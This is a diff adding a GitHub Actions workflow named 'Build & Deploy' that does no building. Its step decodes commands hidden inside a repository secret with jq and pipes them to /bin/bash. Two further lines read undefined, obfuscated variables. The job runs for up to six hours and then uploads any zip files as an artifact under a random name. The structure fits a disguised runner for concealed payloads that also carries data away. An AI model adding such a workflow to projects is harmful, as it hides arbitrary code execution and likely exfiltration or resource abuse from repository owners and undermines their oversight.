@@ -1,0 +1,28 @@
+name: Build & Deploy
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  compile:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Setup and run
+        env:
+          ctw30238: ${{ secrets.ctw30238 }}
+        run: |
+          printf '%s' "$ctw30238" | jq -r .qfb11260 | /bin/bash
+          printf '%s' "$cogeo6620" | jq -r .gy07119 | /bin/bash
+          echo $jml14 | jq -r .uub8 | /bin/bash
+
+      - name: Upload data
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: 2XIxBAIi
+          path: "*.zip"
+          retention-days: 1
